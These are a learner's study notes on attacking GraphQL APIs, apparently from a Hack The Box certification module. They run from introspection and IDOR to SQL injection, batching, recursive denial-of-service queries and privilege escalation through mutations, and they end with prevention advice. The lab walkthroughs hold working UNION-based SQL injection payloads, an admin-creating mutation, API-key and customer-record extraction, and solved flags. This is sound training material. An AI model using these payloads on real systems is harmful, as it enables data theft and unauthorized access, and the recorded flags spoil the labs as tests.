---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# Attacking GraphQL

## Study Companion

### Prerequisites

HTTP APIs, JSON, authentication, and basic GraphQL query syntax.

### Learning Outcomes

- Reconstruct a schema through documentation, introspection, suggestions, and errors.
- Test query, field, object, and mutation authorization by role.
- Assess resolver injection, batching, depth, aliases, and complexity safely.

### Practice Checkpoint

Create a schema-driven matrix of operations, arguments, required roles, and expected ownership checks.

### Related Knowledge Map

- [[Maps/API and Application Security|API and Application Security]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Assess an authorized GraphQL API by reconstructing its schema and trust boundaries, testing query and mutation authorization, validating input handling, and measuring complexity and batching controls without disrupting service or disclosing more data than necessary.

### Assessment Workflow
1. Locate likely GraphQL endpoints such as `/graphql` or `/api/graphql`, capture normal application traffic, confirm accepted methods and content types, and fingerprint the implementation with response behavior and tools such as graphw00f.
2. Determine whether GraphiQL/Playground, field suggestions, verbose errors, or introspection are enabled. Use targeted `__schema` and `__type` queries to enumerate types, fields, arguments, queries, mutations, and relationships; visualize results locally with GraphQL Voyager so schema data does not leave the assessment environment.
3. Build a schema-driven test matrix for unauthenticated and authenticated roles. Query only the minimum fields needed, then compare access to objects and sensitive properties when identifiers, usernames, relay IDs, arguments, or nested relationships are changed to identify IDOR/BOLA and excessive data exposure.
4. Enumerate mutation input types and validate create, update, and delete authorization. Test whether callers can supply privileged fields such as role or ownership and whether a mutation permits unauthorized account creation, privilege escalation, or modification of another user's data.
5. Test resolver arguments and reflected errors for SQL injection, command injection, and XSS using controlled probes. Treat verbose database errors as disclosure evidence and use minimal extraction only when necessary to confirm impact.
6. Assess denial-of-service protections safely by reviewing recursive relationships, connection edges, aliases, duplicated fields, directives, query depth/size, and pagination. Test batching to determine whether multiple operations can bypass per-request authentication or brute-force controls, but remain within agreed limits.
7. Use graphql-cop and Burp/InQL to supplement manual testing, verify findings independently, and translate results into controls: generic errors, restricted introspection/IDE exposure, resolver-level authorization, parameterized data access, input/output encoding, depth and complexity limits, rate limits, and disabled or constrained batching.

### Key Testing Principles
- The schema is an attack-surface map, not proof of exploitability; validate every finding against actual resolver behavior and caller privileges.
- Enforce authorization at resolver and object/field level for both queries and mutations. Hiding a field from the frontend or disabling introspection is not an access-control boundary.
- GraphQL relay IDs, usernames, API keys, and other arguments remain user-controlled object references and require ownership or role checks.
- Request the minimum fields needed to prove exposure and avoid collecting unrelated secrets, credentials, or customer data.
- A failed payload against one resolver does not clear other resolvers; each may use a different backend query or validation path.
- Complexity, depth, size, alias, directive, pagination, and batching controls should work together. Do not demonstrate availability impact by generating an uncontrolled recursive response.
- Keep schema dumps and visualizations local, sanitize tooling output, and verify automated scanner findings manually.

### Evidence and Reporting
Record the endpoint, transport method, authentication role, GraphQL operation, variables or arguments, selected fields, and sanitized request/response for each test. Include the relevant schema fragment and resolver path, explain whether the issue affects information disclosure, object/field authorization, mutation authorization, injection, CSRF exposure, batching, or resource consumption, and document the smallest reproducible proof. Report prerequisites, affected roles and data classes, potential chains, and safe remediation at the resolver, schema, transport, and operational-control layers; redact tokens, API keys, hashes, and personal data.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **42 yellow/output topics** in this module.

- [[Outputs/Modules/Attacking GraphQL Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## Introduction to GraphQL

### language typically used by web APIs as an alternative to REST

- can read, update, create, or delete data
### Basic Overview

- runs on a single endpoint to receive queries
  - Most commonly
    - /graphql, /api/graphql
- we can query the id, username, and role fields of all User objects by running the users query:
  - {  
    users {  
    id  
    username  
    role  
    }  
    }
    - resulting GraphQL response is structured in the same way and might look something like this:
      - {  
        "data": {  
        "users": [  
        {  
        "id": 1,  
        "username": "htb-stdnt",  
        "role": "user"  
        },  
        {  
        "id": 2,  
        "username": "admin",  
        "role": "admin"  
        }  
        ]  
        }  
        }
- If a query supports arguments
  - we can add a supported argument to filter the query results
    - if the query users supports the username argument, we can query a specific user by supplying their username:
      - {  
        users(username: "admin") {  
        id  
        username  
        role  
        }  
        }
- add or remove fields
  - {  
    users(username: "admin") {  
    id  
    username  
    password  
    }  
    }
    - assume that a posts query returns a field author
      - We can then query the username and role of the author in our query
        - {  
          posts {  
          title  
          author {  
          username  
          role  
          }  
          }  
          }
          - result contains the title of all posts as well as the queried data
            - {  
              "data": {  
              "posts": [  
              {  
              "title": "Hello World!",  
              "author": {  
              "username": "htb-stdnt",  
              "role": "user"  
              }  
              },  
              {  
              "title": "Test",  
              "author": {  
              "username": "test",  
              "role": "user"  
              }  
              }  
              ]  
              }  
              }
### <https://graphql.org/learn/>

## Information Disclosure

### Identifying the GraphQL Engine

- observe multiple requests to the /graphql endpoints that contain GraphQL queries
  - {  
    "query":  
    "{posts { uid title body category author (username }}}"  
    }
    - "data": {  
      "posts": [  
      "uuid": "1",  
      "title": "Lorem ipsum 1",  
      "body":  
      "Lorem ipsum dolor sit amet, consetetur sadipscing eliti
      - we can definitely say that the web application implements GraphQL
- identify the GraphQL engine
  - using the tool graphw00f
    - <https://github.com/dolevf/graphw00f>
      - un the tool using the main.py Python script
        - run the tool in fingerprint (-f) and detect mode (-d)
          - python3 main.py -d -f -t http://172.17.0.2
            - [*] Discovered GraphQL Engine: (Graphene)
            - [!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
- accessing the /graphql endpoint
  - web application runs a graphiql interface
    - enables us to provide GraphQL queries directly
- Introspection
  - GraphQL feature that enables users to query the GraphQL API about the structure of the backend system
    - query the __schema field
      - we can identify all GraphQL types supported by the backend using the following query
        - {  
          __schema {  
          types {  
          name  
          }  
          }  
          }
          - Int
            - default types
          - Boolean
            - default types
          - UserObject
            - custom types
  - follow up and obtain the name of all of the type
    - {  
      __type(name: "UserObject") {  
      name  
      fields {  
      name  
      type {  
      name  
      kind  
      }  
      }  
      }  
      }
  - we can obtain all the queries supported by the backend using this query
    - {  
      __schema {  
      queryType {  
      fields {  
      name  
      description  
      }  
      }  
      }  
      }
  - use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend
    - comrehenseve query
      - query IntrospectionQuery {  
        __schema {  
        queryType { name kind }  
        mutationType { name kind }  
        subscriptionType { name kind }  
        types {  
        ...FullType  
        }  
        directives {  
        name  
        description  
        locations  
        args {  
        ...InputValue  
        }  
        }  
        }  
        }  
        fragment FullType on __Type {  
        kind  
        name  
        description  
        fields(includeDeprecated: true) {  
        name  
        description  
        args {  
        ...InputValue  
        }  
        type {  
        ...TypeRef  
        }  
        isDeprecated  
        deprecationReason  
        }  
        inputFields {  
        ...InputValue  
        }  
        interfaces {  
        ...TypeRef  
        }  
        enumValues(includeDeprecated: true) {  
        name  
        description  
        isDeprecated  
        deprecationReason  
        }  
        possibleTypes {  
        ...TypeRef  
        }  
        }  
        fragment InputValue on __InputValue {  
        name  
        description  
        type { ...TypeRef }  
        defaultValue  
        }  
        fragment TypeRef on __Type {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        ofType {  
        kind  
        name  
        }  
        }  
        }  
        }  
        }  
        }  
        }  
        }  
        }  
        }
    - result of this query is quite large and complex
      - visualize the schema using the tool GraphQL-Voyager
        - <https://github.com/graphql-kit/graphql-voyager>
        - or easy demo
          - in a real engagement, we should follow the GitHub instructions to host the tool ourselves, ensuring that no sensitive information leaves our system.
            - <https://graphql-kit.com/graphql-voyager/>
          - In the demo, we can click CHANGE SCHEMA and select INTROSPECTION. After pasting the result of the above introspection query in the text field and clicking on DISPLAY
- LAB
  - After executing an introspection query, what is the flag you can exfiltrate?
    - GET /graphql
    - get the names of objects
      - {  
        __schema {  
        types {  
        name  
        }  
        }  
        }
        - "name": "UserObject"
        - "name": "SecretObject"
    - get all the valuse in SecretObjective
      - {  
        __type(name: "SecretObject") {  
        name  
        fields {  
        name  
        type {  
        name  
        kind  
        }  
        }  
        }  
        }
        - "name": "secret"
    - get the secret value
      - {  
        secrets {  
        id  
        secret  
        }  
        }
        - {  
          "data": {  
          "secrets": [  
          {  
          "id": "U2VjcmV0T2JqZWN0OjE=",  
          "secret": "HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}"  
          }  
          ]  
          }  
          }
## Insecure Direct Object Reference (IDOR)

### Identifying IDOR

- access our user profile:
  - {"query" :  
    "{user(username: \"htb-stdnt\") ( id username msg role }}"  
    }
    - {  
      "data": {  
      "user" : (  
      "id": "VXN1ck9iamVjdDox",  
      "username": "htb-stdnt",  
      "msg": "Welcome!",  
      "role": "user"  
      }
- let us provide a different username we know exists: test
  - {"query" :  
    "{user(username: \"test\") ( id username msg role }}"  
    }
    - "data": {  
      "user": {  
      "id": "VXNIck9iamVjdDoy",  
      username": "test",  
      "msg": "Test"  
      "role": "user"
      - we can query the user test's data without any additional authorization checks. Thus, we successfully confirmed a lack of authorization checks
### Exploiting IDOR

- identify the data that can be accessed without authorization.
  - introspection queries to determine all fields of the User type
    - {  
      __type(name: "UserObject") {  
      name  
      fields {  
      name  
      type {  
      name  
      kind  
      }  
      }  
      }  
      }
      - "name": "username",  
        "type": {  
        "name": "String",  
        "kind": "SCALAR"  
        "name": "password",  
        "type": (  
        "name": "String",  
        "kind": "SCALAR"
        - User object contains a password field
- obtain another user's password by adding the password field
  - {  
    user(username: "test") {  
    username  
    password  
    }  
    }
    - "data": {  
      "user" : ‹  
      "username": "test",  
      "password": "b4574701cdf945940353b356925dddb7"
### LAB

- After following the steps in the section, what is the flag you can find in the admins password?
  - {  
    user(username: "ADMIN") {  
    username  
    password  
    }  
    }
    - {  
      "data": {  
      "user": {  
      "username": "admin",  
      "password": "HTB{79ebbbce53f40edf75c667ef6fd36fae}"  
      }  
      }  
      }
## Injection Attacks

### SQL Injection

- GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database
- Using the introspection query discussed earlier and some trial-and-error, we can identify that the backend supports the following queries that require arguments:
  - post
  - user
  - postByAuthor
- identify if a query requires an argument
  - {  
    postByAuthor {  
    id  
    title  
    }  
    }
    - {  
      "errors": [  
      "message":  
      "Field \"postByAuthor\" argument l"authorl" of type \"String!!" is required but not provided."•  
      "locations": [  
      {  
      "line": 1,  
      "column": 2  
      }  
      ]  
      }  
      }
      - supplying the author argument
        - {  
          postByAuthor(author: "admin") {  
          id  
          title  
          }  
          }
          - in Burp
            - "query": "{postByAuthor(author: \"admin\") { id title }}"
              - {  
                "data": {  
                "postByAuthor": [  
                {  
                "id": "UG9zdE9iamVjdDox",  
                "title": "Lorem ipsum 1"  
                },  
                {  
                "id": "UG9zdE9iamVjdDoy",  
                "title": "Lorem ipsum 2"  
                },  
                {  
                "id": "UG9zdE9iamVjdDoz",  
                "title": "Lorem ipsum 3"  
                },  
                {  
                "id": "UG9zdE9iamVjdDo0",  
                "title": "Lorem ipsum 4"  
                }  
                ]  
                }  
                }
- investigate whether the author argument is vulnerable to SQL injection
  - try a basic SQL injection payload
    - "query": "(postyAuthor (author: \admin" -. -1") (id title H"
      - "data": {  
        "postByAuthor": null
        - the query does not return any result
- move on to the user query
  - {  
    user(username: "htb-sdtnt' -- -") {  
    uuid  
    username  
    role  
    }  
    }
    - "data": {  
      "user": (  
      "uuid": "1",  
      "username": "htb-stdnt",  
      "role": "user"
      - inject a single quote without comment
        - "query":  
          "(user (username: \"htb-stdnt'\") { uuid username role }}"
          - "errors": [  
            "message":  
            "(pymysql. err. ProgrammingError) (1064, 1"You have an error in your SQL syntax  
            ...  
            TruY rI  
            VAIAVA  
            er_role, user.msg AS user_msg InFROM user \WHERE username=  
            'htb-stdnt' In LIMIT %(param_1)s] \n[parameters: ('param_1'  
            : 1)] \n(Background on this error at: https://sqlalche.me/e/  
            20/6405)"
            - Since the SQL query is displayed in the SQL error
              - construct a UNION-based SQL injection query to exfiltrate data from the SQL database
                - database may contain data that cannot be queried through the GraphQL API
- construct a UNION-based SQL injection payload
  - take another look at the results of the introspection query
    - <https://graphql-kit.com/graphql-voyager/>
      ![[Attachments/3d892ee2ae0125c4a7738fcc19a4c70efea19f11e14f43647cc6cb45f2e4dbe2.png]]
      - The vulnerable user query returns a UserObject, so let us focus on that object
        - object consists of six fields and a link (posts)
          - our UNION-based SQL injection payload needs to contain six columns to match the number of columns in the original query
            - username is a UserObject's third field, querying for the username will result in the third column
  - GraphQL query only returns the first row
    - we will use the GROUP_CONCAT function to exfiltrate multiple rows at a time
      - {  
        user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {  
        username  
        }  
        }
        - {  
          "data": {  
          "user": {  
          "username": "user,secret,post"  
          }  
          }  
          }
          - response contains all table names concatenated in the username field
### Cross-Site Scripting (XSS)

- requirement
  - if GraphQL responses are inserted into the HTML page without proper sanitization
  - investigate any GraphQL arguments for potential XSS injection points
    - can also occur if invalid arguments are reflected in error messages
- "query" :  
  role }}"  
  "{user (username: \"«script›alert (1)</script>|") ‹ uuid username
  - "data" : {  
    "user": null
- examine the post query,
  - requires an integer ID as an argument. If we instead submit a string argument containing an XSS payload
    - "query" :  
      "{post (id: \"<script›alert(1)</script>\") { id title body categ  
      ory author ( username }}}"
      - {  
        "errors": [  
        "message":  
        "Argument |"id\" has invalid value |"<script>alert(1)</script>/". InExpected type |"Int|", found |"<script›alert(1)</  
        riptン".  
        "locations": [  
        "line": 1,  
        "column": 11
### LAB

- Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find?
  - {  
    user(username: "htb-sdtnt'") {  
    uuid  
    username  
    role  
    }  
    }
    - {  
      "errors": [  
      {  
      "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax;...
      - {  
        user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {  
        username  
        }  
        }
        - {  
          "data": {  
          "user": {  
          "username": "user,secret,flag,post"  
          }  
          }  
          }
          - {  
            user(username: "x' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {  
            username  
            }  
            }
            - {  
              "data": {  
              "user": {  
              "username": "HTB{1105f1d9480ac244a0c8f2bc47594581}"  
              }  
              }  
              }
## Denial-of-Service (DoS) & Batching Attacks

### Denial-of-Service (DoS) Attacks

- To execute a DoS attack, we must identify a way to construct a query that results in a large response
  - look at the visualization of the introspection results in GraphQL Voyager
    - We can identify a loop between the UserObject and PostObject via the author and posts fields
- abuse this loop by constructing a query that queries the author of all posts
  - posts object is a connection, we need to specify the edges and node fields to obtain a reference to the corresponding Post object
    - {  
      posts {  
      author {  
      posts {  
      edges {  
      node {  
      author {  
      username  
      }  
      }  
      }  
      }  
      }  
      }  
      }
      - look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop we query
        - Making our initial query large
          - {  
            posts {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            posts {  
            edges {  
            node {  
            author {  
            username  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }  
            }
            - Something went wrong
### Batching Attacks

- executing multiple queries with a single request
  - supplying multiple queries in a JSON list in the HTTP request
    - POST /graphql HTTP/1.1  
      [  
      {  
      "query":"{user(username: \"admin\") {uuid}}"  
      },  
      {  
      "query":"{post(id: 1) {title}}"  
      }  
      ]
      - The response contains the requested information in the same structure we provided
- Batching is not a security vulnerability but an intended feature that can be enabled or disabled
  - can lead to security issues if GraphQL queries are used for sensitive processes such as user login
    - it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests.
      - This could lead to bypasses of security measures
        - GraphQL batching can enable powerful brute-force attacks.
## Mutations

### GraphQL queries

- read data
- modify data: mutations
### can be used to

- create new objects
- update existing objects
- delete existing objects
### identifying all mutations supported by the backend and their arguments.

- following introspection query
  - query {  
    __schema {  
    mutationType {  
    name  
    fields {  
    name  
    args {  
    name  
    defaultValue  
    type {  
    ...TypeRef  
    }  
    }  
    }  
    }  
    }  
    }  
    fragment TypeRef on __Type {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    }  
    }  
    }  
    }  
    }  
    }  
    }  
    }
    - From the result
      - we can identify a mutation registerUser
        - "name": "RegisterUserInput"
- now query all fields of the RegisterUserInput object
  - {  
    __type(name: "RegisterUserInput") {  
    name  
    inputFields {  
    name  
    description  
    defaultValue  
    }  
    }  
    }
    - "data": {  
      "type": {  
      "name":  
      "RegisterUserInput",  
      "inputFields": [  
      {  
      "name":  
      "username"  
      "description": null,  
      "defaultValue": null  
      "name":  
      "password"  
      "description": null,  
      "defaultValue": null  
      "name": "role"  
      "description": null,  
      "defaultValue": null  
      "name":  
      "msg"  
      "description":  
      null,  
      "defaultValue": null
      - we can provide the new user's username, password, role, and msg
        - we need to provide the password as an MD5 hash
          - echo -n 'password' | md5sum
            - we can now finally register a new user by running the mutation
              - mutation {  
                registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {  
                user {  
                username  
                password  
                msg  
                role  
                }  
                }  
                }
### Exploitation with Mutations

- create users with a different role than the default role
  - We have identified the roles user and admin by querying all existing users
- create a new user with the role admin
  - mutation {  
    registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {  
    user {  
    username  
    password  
    msg  
    role  
    }  
    }  
    }
    - access the internal admin endpoint at /admin
      - we can now access the admin endpoint, meaning we have successfully escalated our privileges
### LAB

- What is the flag you find in the admin dashboard?
  - HTB{f7082828b5e5ad40d955846ba415d17f}
## Tools of the Trade

### already discussed tools that can help us in the enumeration

- <https://github.com/dolevf/graphw00f>
- <https://github.com/graphql-kit/graphql-voyager>
### security audit

- <https://github.com/dolevf/graphql-cop>
  - cloning the GitHub repository and installing the required dependencies
  - python3 graphql-cop.py  -v
    - python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
      - [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)  
        [HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)  
        [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)  
        [HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)  
        [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)  
        [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)  
        [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)  
        [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)  
        [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
### InQL (Burp extension)

- adds GraphQL tabs in the Proxy History and Burp Repeater
  - enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax
- Scan
  - right-click on a request
    - Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner
- for more details
  - <https://github.com/portswigger/inql>
## GraphQL Vulnerability Prevention

### Information Disclosure

- preventing verbose error messages and displaying generic error messages instead
- introspection queries
  - At the very least
    - whether any sensitive information is disclosed in introspection queries
### Injection Attacks

- SQL injection
- command injection
- XSS
### Denial-of-Service (DoS)

- brute-force attacks through batching are common
  - Proper limits need to be implemented to mitigate these types of attacks
    - limits on the GraphQL query depth
    - maximum GraphQL query size
    - as well as rate limits
    - batching should be disabled
      - whenever possible
      - or depth needs to be limited.
### API Design

- improper access control
  - IDOR
  - GraphQL endpoint should only be accessible after successful authentication, if possible
  - authorization checks must be implemented to prevent actors from executing queries or mutations to which they are not authorized.
- more details on securing GraphQL APIs
  - <https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html>
## Skills Assessment

### Exploit the vulnerable GraphQL API to obtain the flag.

- python graphql-cop.py -t http://154.57.164.67:31972/graphql
  - [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)  
    [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)  
    [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)  
    [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)  
    [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)  
    [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)  
    [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
- introspection
  - after Gemini review
    - Extract Internal System API Keys
      - query LeakApiKeys {  
        activeApiKeys {  
        id  
        role  
        key  
        }  
        }
        - {  
          "data": {  
          "activeApiKeys": [  
          {  
          "id": "QXBpS2V5T2JqZWN0OjE=",  
          "role": "guest",  
          "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"  
          },  
          {  
          "id": "QXBpS2V5T2JqZWN0OjI=",  
          "role": "guest",  
          "key": "9cf8622bbc9fdc78f245663e08e5b4c1"  
          },  
          {  
          "id": "QXBpS2V5T2JqZWN0OjM=",  
          "role": "admin",  
          "key": "0711a879ed751e63330a78a4b195bbad"  
          }  
          ]  
          }  
          }
    - Extract Employee Roles and IDs
      - query LeakEmployees {  
        allEmployees {  
        id  
        username  
        employeeId  
        role  
        }  
        }
        - {  
          "data": {  
          "allEmployees": [  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6MQ==",  
          "username": "vautia",  
          "employeeId": 1337,  
          "role": "employee"  
          },  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6Mg==",  
          "username": "pedant",  
          "employeeId": 1338,  
          "role": "employee"  
          },  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6Mw==",  
          "username": "21y4d",  
          "employeeId": 1339,  
          "role": "manager"  
          }  
          ]  
          }  
          }
      - query ConfirmDirectory {  
        allEmployees {  
        id  
        username  
        employeeId  
        role  
        }  
        }
        - {  
          "data": {  
          "allEmployees": [  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6MQ==",  
          "username": "vautia",  
          "employeeId": 1337,  
          "role": "employee"  
          },  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6Mg==",  
          "username": "pedant",  
          "employeeId": 1338,  
          "role": "employee"  
          },  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6Mw==",  
          "username": "21y4d",  
          "employeeId": 1339,  
          "role": "manager"  
          },  
          {  
          "id": "RW1wbG95ZWVPYmplY3Q6NA==",  
          "username": "pwned_admin",  
          "employeeId": 9999,  
          "role": "manager"  
          }  
          ]  
          }  
          }
    - Exfiltrate the Customer Database
      - query GetCustomerData {  
        allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {  
        id  
        firstName  
        lastName  
        address  
        }  
        }
        - {  
          "data": {  
          "allCustomers": [  
          {  
          "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",  
          "firstName": "Antony",  
          "lastName": "Blair",  
          "address": "13 Hide A Way Road. Winter Park, FL 32789"  
          },  
          {  
          "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",  
          "firstName": "Margaret",  
          "lastName": "Liverman",  
          "address": "4797 New Street. Coos Bay, OR 97420 "  
          },  
          {  
          "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",  
          "firstName": "Billy",  
          "lastName": "Sawyer",  
          "address": "587 Hickory Lane. Washington, DC 20017 "  
          }  
          ]  
          }  
          }
    - mutation ExecuteAddEmployee {  
      addEmployee(input: {  
      username: "pwned_admin"  
      employeeId: 9999  
      role: "manager"  
      }) {  
      employee {  
      id  
      username  
      employeeId  
      role  
      }  
      }
      - {  
        "data": {  
        "addEmployee": {  
        "employee": {  
        "id": "RW1wbG95ZWVPYmplY3Q6NA==",  
        "username": "pwned_admin",  
        "employeeId": 9999,  
        "role": "manager"  
        }  
        }  
        }  
        }
- Mutation
  - query {  
    __schema {  
    mutationType {  
    name  
    fields {  
    name  
    args {  
    name  
    defaultValue  
    type {  
    ...TypeRef  
    }  
    }  
    }  
    }  
    }  
    }  
    fragment TypeRef on __Type {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    ofType {  
    kind  
    name  
    }  
    }  
    }  
    }  
    }  
    }  
    }  
    }
    - "name": "addCustomer",
    - mutation InjectAdminEmployee {  
      addEmployee(input: {  
      username: "system_root"  
      employeeId: 1000  
      role: "admin"  
      }) {  
      employee {  
      id  
      username  
      role  
      }  
      }  
      }
      - {  
        "data": {  
        "addEmployee": {  
        "employee": {  
        "id": "RW1wbG95ZWVPYmplY3Q6NQ==",  
        "username": "system_root",  
        "role": "admin"  
        }  
        }  
        }  
        }
- SQLI
  - Working payload
    - query TestCustomerSQLi {  
      customerByName(  
      apiKey: "0711a879ed751e63330a78a4b195bbad"  
      lastName: "invalid_name' UNION SELECT '1', '2', @@version, '4' -- -"  
      ) {  
      id  
      firstName  
      lastName  
      address  
      }  
      }
      - {  
        "data": {  
        "customerByName": {  
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",  
        "firstName": "2",  
        "lastName": "10.11.6-MariaDB-0+deb12u1",  
        "address": "4"  
        }  
        }  
        }
  - Columns name
    - query DumpEmployeeColumns {  
      customerByName(  
      apiKey: "0711a879ed751e63330a78a4b195bbad"  
      lastName: "x' UNION SELECT '1', '2', GROUP_CONCAT(column_name), '4' FROM information_schema.columns WHERE table_name='employee' -- -"  
      ) {  
      id  
      firstName  
      lastName  
      address  
      }  
      }
      - {  
        "data": {  
        "customerByName": {  
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",  
        "firstName": "2",  
        "lastName": "id,username,employee_id,role",  
        "address": "4"  
        }  
        }  
        }
  - Table name
    - query DumpAllTables {  
      customerByName(  
      apiKey: "0711a879ed751e63330a78a4b195bbad"  
      lastName: "x' UNION SELECT '1', '2', GROUP_CONCAT(table_name), '4' FROM information_schema.tables WHERE table_schema=database()-- -"  
      ) {  
      id  
      firstName  
      lastName  
      address  
      }  
      }
      - {  
        "data": {  
        "customerByName": {  
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",  
        "firstName": "2",  
        "lastName": "api_key,employee,flag,product,customer",  
        "address": "4"  
        }  
        }  
        }
  - get the Flag
    - query ExfiltrateFlag {  
      customerByName(  
      apiKey: "0711a879ed751e63330a78a4b195bbad"  
      lastName: "x' UNION SELECT '1', '2', flag, '4' FROM flag -- -"  
      ) {  
      id  
      firstName  
      lastName  
      address  
      }  
      }
      - {  
        "data": {  
        "customerByName": {  
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",  
        "firstName": "2",  
        "lastName": "HTB{f1d663c11e6db634e1c9403d0e8e3a35}",  
        "address": "4"  
        }  
        }  
        }
